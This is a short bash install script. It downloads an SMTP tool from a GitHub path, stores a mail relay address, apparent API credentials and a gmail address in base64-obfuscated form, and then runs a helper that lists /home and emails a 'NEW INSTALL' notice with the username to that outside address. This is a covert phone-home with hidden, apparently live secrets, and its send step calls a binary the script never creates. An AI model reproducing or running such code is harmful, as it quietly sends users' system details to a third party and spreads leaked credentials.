#!/bin/bash
Uname=$(head -1 inuser.txt)
gitpath=$(head -1 gitpath.txt)
mkdir -p noti
cd noti/
wget https://raw.githubusercontent.com/$gitpath/main/gitclone/smtp-cli
echo "NEW INSTALL $Uname" > status.txt
#base64 -d core.txt > mcore
chmod +x smtp-cli

tee -a emcf.sh <<EOF
mhotpot=$(echo -n 'aW4tdjMubWFpbGpldC5jb206NTg3' | base64 --decode)
mabi=$(echo -n 'YzY2ODA0YzA2YzY5ZjEzMzZiOTM4ZTEwNmUxZDUxZjA=' | base64 --decode)
musec=$(echo -n 'YTMzNTdlNjVjMmNlODlkOTFlNTJmZTEzYzA2N2FlOWQ=' | base64 --decode)
mform=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
mtors=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
messtxt=status.txt
#--verbose
EOF
chmod +x emcf.sh

tee -a dosend.sh <<EOF
#!/bin/bash
Uname=$(ls /home)
source emcf.sh

./mcore --missing-modules-ok \
--host  $mhotpot \
--enable-auth --user $mabi --password $musec \
--from $mform --to $mtors \
--data $messtxt
EOF

chmod +x dosend.sh
# Test
sh dosend.sh

cd ..
